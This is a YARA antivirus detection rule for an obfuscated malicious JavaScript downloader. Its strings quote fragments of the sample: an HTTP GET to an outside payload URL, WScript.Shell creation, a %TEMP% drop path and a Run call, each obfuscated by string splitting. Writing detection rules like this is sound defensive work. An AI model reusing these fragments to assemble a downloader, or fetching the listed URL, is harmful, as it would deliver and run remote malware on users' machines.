rule sig_20160427_8bd0e5342176359d0071ebc0ee8dc76d {
  meta:
    description = "datamaliciousorder - file 20160427_8bd0e5342176359d0071ebc0ee8dc76d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0a4d102d2be0f3460ee044153dec0d134ae5f0c7e47e339583c7e8d163cc3e03"

  strings:
    $s1  = "IqoctAdfwb[PxilaLzwti](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/ur8fgs\", false);" fullword ascii
    $s2  = "function SkygjSwyka() {return WtvkiQiubd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"C24eYAY" ascii
    $s3  = "function SkygjSwyka() {return WtvkiQiubd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"C24eYAY" ascii
    $s4  = "function UpvfpQmtva(KwcvdNcsni, JradsShpcy){VztazHuxvz = VztazHuxvz * 1; return KwcvdNcsni - JradsShpcy;};" fullword ascii
    $s5  = "var WtvkiQiubd = function CwhpnPmiun() {return XtlxqPkwos[TqbbhSzvte](\"WScript\"+\".Shell\");}(), HqdnqZboik = 11;" fullword ascii
    $s6  = "var XtlxqPkwos = this[\"WScript\"];" fullword ascii
    $s7  = "function LlzoiBklpj(){return SirdjRerwo + \"\";};" fullword ascii
    $s8  = "if (IqoctAdfwb[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function GumdeXjdci() {return ((WmkhnAsssu == true) && (WmkhnAsssu == JgdcuRjcyt)) ? 1 : VztazHuxvz;};" fullword ascii
    $s10 = "function KgvjwSszkc(IleqqCgelz) {var OjqsxBiyfk = (1, 2, 3, 4, 5, IleqqCgelz); return OjqsxBiyfk;};" fullword ascii
    $s11 = "return UpvfpQmtva(FemgpVkjhs, LrvnhAjjdn);" fullword ascii
    $s12 = "function RidluZjpow(MdchjSyhde){WtvkiQiubd[\"R\"+\"un\"](MdchjSyhde, VztazHuxvz, VztazHuxvz);};" fullword ascii
    $s13 = "}while (WtrsgAqosr);" fullword ascii
    $s14 = "function LwiyjFgdsj(){return TqbbhSzvte;};" fullword ascii
    $s15 = "var WmkhnAsssu = false;" fullword ascii
    $s16 = "AjeanRmjsq = true;" fullword ascii
    $s17 = "function FjyzjIvugq(){return 23;};" fullword ascii
    $s18 = "function PwgjlMhubi()" fullword ascii
    $s19 = "WmkhnAsssu = true; " fullword ascii
    $s20 = "var ThmxiXdpkw = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}